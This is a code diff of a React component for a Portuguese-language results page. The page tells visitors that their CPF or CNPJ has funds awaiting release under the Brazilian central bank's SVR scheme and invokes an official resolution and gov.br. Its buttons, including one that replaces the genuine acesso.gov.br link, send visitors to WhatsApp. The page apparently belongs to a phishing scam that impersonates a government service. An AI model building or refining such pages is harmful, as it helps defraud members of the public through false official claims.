@@ -168,19 +168,18 @@ export function Step2({ data, onReset }: Step2Props) {
           key="results"
           initial={{ opacity: 0, y: 10 }}
           animate={{ opacity: 1, y: 0 }}
-          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] w-full max-w-[880px] mx-auto shadow-md transition-colors duration-300"
+          className="bg-white dark:bg-[#1f292e] rounded-[4px] w-full max-w-[880px] mx-auto shadow-sm transition-colors duration-300"
         >
-            {/* Image 3 Style Structure */}
-            <div className="p-10 md:p-16 flex flex-col md:flex-row items-start md:items-center gap-10 md:gap-20">
+            <div className="p-8 md:p-12 flex flex-col md:flex-row items-center md:items-start gap-8 md:gap-12">
               
               {/* Left Side: Large Checkmark */}
-              <div className="flex-shrink-0 w-full md:w-auto flex justify-center">
-                <div className="w-32 h-32 md:w-48 md:h-48">
-                  <svg viewBox="0 0 52 52" className="w-full h-full text-[#4caf50]">
+              <div className="flex-shrink-0 w-full md:w-auto flex justify-center md:pt-4">
+                <div className="w-32 h-32 md:w-40 md:h-40">
+                  <svg viewBox="0 0 52 52" className="w-full h-full text-[#5cb85c]">
                     <path 
                       fill="none" 
                       stroke="currentColor" 
-                      strokeWidth="3" 
+                      strokeWidth="6" 
                       strokeLinecap="round" 
                       strokeLinejoin="round" 
                       d="M14 27l8 8 16-16" 
@@ -190,72 +189,60 @@ export function Step2({ data, onReset }: Step2Props) {
               </div>
 
               {/* Right Side: Content */}
-              <div className="flex-grow space-y-8">
+              <div className="flex-grow space-y-6 w-full">
                 
                 {/* Identification Header */}
-                <div className="space-y-4">
-                  <h2 className="text-[26px] md:text-[38px] font-bold text-[#455a64] dark:text-white leading-tight">
-                    O {data.docType} pesquisado possui ativos para liberação imediata
+                <div className="text-center space-y-3">
+                  <h2 className="text-[22px] md:text-[28px] font-bold text-[#555] dark:text-gray-200">
+                    O {data.docType} pesquisado possui ativos para liberação
                   </h2>
-                  <div className="text-[15px] md:text-[18px] text-[#444] dark:text-gray-300 font-medium">
-                     <p className="flex gap-2"><span>{data.docType}:</span> <span className="font-bold">{data.docValue}</span></p>
-                     <p className="flex gap-2"><span>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}:</span> <span className="font-bold">{data.birthDate}</span></p>
+                  <div className="text-[14px] md:text-[15px] text-[#666] dark:text-gray-400 font-medium space-y-1">
+                     <p>{data.docType}: <span className="font-bold text-black dark:text-white">{data.docValue}</span></p>
+                     <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <span className="font-bold text-black dark:text-white">{data.birthDate}</span></p>
                   </div>
                 </div>
 
                 {/* Highlighted Instruction Box (Gray) */}
-                <div className="bg-[#f0f2f5] dark:bg-[#2c3e50] p-5 md:p-6 rounded-sm border-l-4 border-gray-400">
-                  <p className="text-[15px] md:text-[18px] font-bold text-[#455a64] dark:text-gray-100">
-                    O procedimento de resgate está sujeito à validação de segurança conforme a Resolução BCB nº 4.862/2020.
+                <div className="bg-[#f2f4f6] dark:bg-[#2c3e50] py-3 px-5 rounded-sm">
+                  <p className="text-[15px] md:text-[16px] font-bold text-[#444] dark:text-gray-200 text-center">
+                    A liberação está sujeita à validação de segurança conforme Resolução BCB nº 4.862
                   </p>
                 </div>
 
                 {/* Descriptions */}
-                <div className="space-y-5 text-[15px] md:text-[17px] text-[#555] dark:text-gray-300 leading-relaxed">
+                <div className="space-y-4 text-[14px] md:text-[15px] text-[#666] dark:text-gray-300">
                   <p>
-                    Para garantir a integridade da transferência fiscal, o sistema exige a conclusão das etapas obrigatórias de homologação documental e vínculo bancário do titular.
+                    Para garantir a integridade da transferência, você precisa concluir as etapas obrigatórias de homologação documental e vínculo bancário do titular.
                   </p>
                   <p>
-                    A liberação dos ativos será processada de forma sigilosa e segura após a autenticação em tempo real realizada através de nossos canais oficiais.
+                    No SVR, a liberação dos ativos será processada de forma sigilosa e segura após a autenticação realizada através de nossos canais oficiais (nesse caso, você precisa ser o titular ou procurador).
                   </p>
                 </div>
 
-                {/* Primary Action Button (Liberar) */}
-                <div className="pt-4">
-                   <button
-                    onClick={handleWhatsAppRedirect}
-                    className="w-full md:w-auto bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-4 px-12 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] md:text-[18px] shadow-sm uppercase tracking-wide"
-                  >
-                    <ArrowRight size={22} className="-rotate-45" /> Liberar Valores Disponíveis
-                  </button>
-                </div>
-
-                {/* Secondary Action Buttons Row (Image 3 Style) */}
-                <div className="flex flex-col md:flex-row gap-4 pt-2">
+                {/* Action Buttons Row */}
+                <div className="flex flex-col sm:flex-row justify-center gap-4 pt-2">
                   <button
-                    onClick={onReset}
-                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm"
+                    onClick={handleWhatsAppRedirect}
+                    className="flex-1 bg-[#007087] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
                   >
-                    <Search size={18} /> Nova consulta
+                    <CheckCircle2 size={18} /> Liberar Valores
                   </button>
                   <button
                     onClick={() => window.location.reload()}
-                    className="bg-[#007b92] hover:bg-[#005a6b] text-white font-bold py-2.5 px-8 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] md:text-[16px] shadow-sm"
+                    className="flex-1 bg-[#007087] hover:bg-[#005a6b] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-2 transition-all text-[15px] shadow-sm"
                   >
                     <X size={18} /> Sair
                   </button>
                 </div>
 
                 {/* Footer Link */}
-                <div className="pt-10 border-t border-gray-100 dark:border-gray-800 text-center md:text-left">
-                  <a 
-                    href="https://acesso.gov.br" 
-                    target="_blank" 
-                    rel="noopener noreferrer"
-                    className="text-[13px] md:text-[14px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-bold"
+                <div className="pt-6 text-center">
+                  <button 
+                    onClick={handleWhatsAppRedirect}
+                    className="text-[13px] md:text-[14px] text-[#0066cc] dark:text-[#4da3ff] hover:underline cursor-pointer bg-transparent border-none p-0 text-left md:text-center w-full"
                   >
                     *Saiba como realizar a validação de segurança e aumentar seu nível de confiabilidade gov.br (Prata ou Ouro).
-                  </a>
+                  </button>
                 </div>
 
               </div>
